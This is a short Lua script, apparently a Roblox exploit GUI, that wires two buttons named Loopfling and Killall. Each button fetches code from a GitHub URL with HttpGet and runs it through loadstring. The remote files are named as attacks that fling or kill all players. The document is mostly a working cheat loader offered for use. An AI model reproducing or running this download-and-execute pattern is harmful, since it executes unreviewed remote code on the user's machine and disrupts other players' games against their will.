-- Scripts:

local function NGZCBU_fake_script() -- Loopfling.LocalScript 
	local script = Instance.new('LocalScript', Loopfling)

	
	function handleActivated()
	    loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()
	end
	
	script.Parent.Activated:Connect(handleActivated)
end
coroutine.wrap(NGZCBU_fake_script)()
local function STHOSWI_fake_script() -- Killall.LocalScript 
	local script = Instance.new('LocalScript', Killall)

	function handleActivated()
	    loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Kill%20All'))()
	end
	
	script.Parent.Activated:Connect(handleActivated)
end
coroutine.wrap(STHOSWI_fake_script)()
